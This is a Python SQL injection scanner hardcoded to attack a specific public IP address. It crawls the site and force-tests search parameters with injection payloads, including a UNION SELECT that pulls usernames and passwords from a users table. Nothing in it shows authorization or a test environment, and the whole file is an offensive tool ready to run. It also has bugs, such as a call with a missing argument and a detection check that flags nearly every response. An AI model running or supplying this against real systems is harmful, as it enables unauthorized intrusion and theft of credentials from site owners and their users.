#!/usr/bin/env python3
"""
Advanced SQLi Scanner v2 - Optimized for search bars & dynamic inputs
Target: http://52.247.225.51
Python 3.8+ | pip install requests
"""

import requests
from urllib.parse import urlparse, parse_qs, urljoin, quote
import re
import time
import concurrent.futures
import json
import sys

# ================= CONFIGURATION =================
TARGET = "http://52.247.225.51"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner/2.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}
TIMEOUT = 10
MAX_DEPTH = 3
WORKERS = 10
TIME_SLEEP = 4          # Seconds for time-based payloads
DEBUG = False           # Set True to print response snippets

# Common search parameters to force-test
SEARCH_PARAMS = ["q", "search", "query", "s", "keyword", "term", "filter"]

# SQLi Payloads (requests handles URL encoding automatically)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    f"1' AND SLEEP({TIME_SLEEP})--",
    "' OR 1=1--",
    "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --"
]

# Detection patterns
ERROR_PATTERNS = re.compile(
    r"(SQL syntax|MySQL|PostgreSQL|Oracle|SQLite|Warning|Error|Unclosed quotation|"
    r"syntax error|incorrect syntax|unclosed quote|near '' at line)",
    re.I
)
CONTENT_KEYWORDS = ["admin", "root", "password", "user", "table", "column", "select"]

# ================= CORE FUNCTIONS =================
def get_baseline(url, params):
    try:
        resp = requests.get(url, params=params, headers=HEADERS, timeout=TIMEOUT)
        return len(resp.text), resp.status_code, resp.text[:500]  # First 500 chars for debug
    except Exception as e:
        if DEBUG: print(f"[-] Baseline error: {e}")
        return None, None, ""

def test_param(url, param_name, original_val):
    baseline_len, status, _ = get_baseline(url, {param_name: original_val})
    if baseline_len is None:
        return []

    results = []
    for payload in SQLI_PAYLOADS:
        test_params = {param_name: f"{original_val}{payload}"}
        try:
            resp = requests.get(url, params=test_params, headers=HEADERS, timeout=TIMEOUT)
            is_vuln = False
            reason = ""

            # 1. Error-based detection
            if ERROR_PATTERNS.search(resp.text):
                is_vuln = True; reason = "Error-based"

            # 2. Length/Content diff (ignore minor JS/CSS changes)
            elif len(resp.text) != baseline_len or any(kw in resp.text.lower() for kw in CONTENT_KEYWORDS):
                is_vuln = True; reason = "Boolean/Content"

            # 3. Time-based detection
            if not is_vuln:
                time_params = {param_name: f"{original_val} AND SLEEP({TIME_SLEEP})--"}
                start = time.time()
                requests.get(url, params=time_params, headers=HEADERS, timeout=TIMEOUT + 5)
                elapsed = time.time() - start
                if elapsed > TIME_SLEEP + 1.0:
                    is_vuln = True; reason = "Time-based"

            if is_vuln:
                results.append({
                    "url": url,
                    "param": param_name,
                    "payload": payload,
                    "type": reason,
                    "status_code": resp.status_code,
                    "response_length": len(resp.text)
                })
        except Exception as e:
            if DEBUG: print(f"[-] Payload error: {e}")
    return results

def crawl_and_test(base_url):
    visited = set()
    queue = [(base_url, 0)]
    targets = []
    netloc = urlparse(base_url).netloc

    while queue:
        url, depth = queue.pop(0)
        if url in visited or depth > MAX_DEPTH: continue
        visited.add(url)

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            targets.append((url, {k: v[0] for k, v in params.items()}))

        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
            if resp.status_code != 200 or not resp.text: continue
            links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
            for link in links:
                full = urljoin(base_url, link)
                p = urlparse(full)
                if (p.netloc == netloc and p.scheme in ('http','https') and '#' not in full):
                    queue.append((full, depth + 1))
        except: continue

    return targets

def test_search_bar_directly(base_url):
    """Force-test common search parameters even if not found via crawling"""
    parsed = urlparse(base_url)
    base_path = parsed.path.rstrip('/') or '/'
    results = []
    
    print(f"[*] Direct testing search bar at: {base_url}{base_path}")
    for param in SEARCH_PARAMS:
        # Test with empty, default, and common values
        for val in ["", "test", "1", "'"]:
            url = f"{parsed.scheme}://{parsed.netloc}{base_path}"
            vulns = test_param(url, param, val)
            results.extend(vulns)
    return results

# ================= MAIN EXECUTION =================
def main():
    print(f"🎯 Target: {TARGET}")
    
    # 1. Crawl & test found parameters
    crawled_targets = crawl_and_test(TARGET)
    print(f"[+] Found {len(crawled_targets)} URLs with query parameters.")
    
    all_results = []
    if crawled_targets:
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
            futures = [executor.submit(test_param, url, p) for url, params in crawled_targets for p in params]
            for f in concurrent.futures.as_completed(futures):
                all_results.extend(f.result())

    # 2. Direct search bar testing (fixes missed inputs)
    direct_results = test_search_bar_directly(TARGET)
    all_results.extend(direct_results)

    # 3. Output
    if all_results:
        print("\n" + "="*60)
        print("🚨 SQL INJECTION VULNERABILITIES FOUND 🚨")
        print("="*60)
        for i, r in enumerate(all_results, 1):
            print(f"\n[{i}] URL: {r['url']}")
            print(f"    Param: {r['param']} | Payload: {r['payload']}")
            print(f"    Type: {r['type']} | Status: {r['status_code']} | Len: {r['response_length']}")
        with open("sqli_results_v2.json", "w", encoding="utf-8") as f:
            json.dump(all_results, f, indent=2)
        print(f"\n💾 Saved to sqli_results_v2.json")
    else:
        print("\n[+] No SQLi vulnerabilities detected.")

if __name__ == "__main__":
    main()
